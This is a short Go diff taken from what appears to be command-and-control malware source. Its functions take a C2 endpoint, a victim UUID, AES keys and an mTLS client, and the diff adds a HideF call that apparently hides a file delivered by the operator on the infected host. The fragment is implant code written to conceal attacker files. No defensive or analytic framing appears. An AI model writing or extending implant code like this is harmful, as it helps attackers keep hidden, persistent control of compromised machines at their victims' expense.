@@ -127,6 +127,7 @@ func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mT
 }
 
 func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
+	HideF(fname)
 	if runtime.GOOS == "linux" {
 		fname = "./" + fname
 	}
